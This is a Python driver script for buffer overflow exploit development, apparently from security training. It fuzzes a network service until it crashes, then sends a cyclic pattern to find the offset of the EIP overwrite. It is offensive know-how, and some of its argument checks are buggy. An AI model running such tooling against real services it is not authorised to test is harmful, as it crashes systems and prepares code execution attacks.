#!/usr/bin/python3

from get_args import input_args
from fuzzer import Fuzz
from target import Target
import sys
from IPy import IP
from create_pattern import Pattern
import user_input


def main():
    args = input_args()
    pattern = Pattern()

    if type(args.len) is int:
        print(pattern.create_pattern(args.len))
        if len(args) == 1:
            sys.exit()

    if IP(args.ip) or 'localhost' and (type(args.port) is int and 0 < args.port < 65533):

        target_dict = {'ip': args.ip,
                       'port': args.port,
                       'path': args.path}

        target = Target(target_dict)
        fuzz = Fuzz(target)

        fuzz_length = args.len if args.len else 100

        # bytes to crash program
        crash_bytes = fuzz.find_crash(fuzz_length)
        print(f'[*] Program crashed at {crash_bytes} bytes...')

        # Create pattern from crash bytes plus 300 byte padding
        pat = pattern.create_pattern(crash_bytes + 300)

        user_input.get_input("DEBUG....")

        # Send pattern to application to identify EIP overwrite
        fuzz.locate_eip(pat)

        # Get EIP value
        eip_query = user_input.get_input("EIP String")

        # Find position of EIP query in string
        # NOTE: Decodes EIP hex to ascii before passing
        offset = pattern.find_offset(bytearray.fromhex(eip_query).decode())

        print(offset)

    else:
        print("Invalid Arguments")
        sys.exit()


if __name__ == "__main__":
    main()
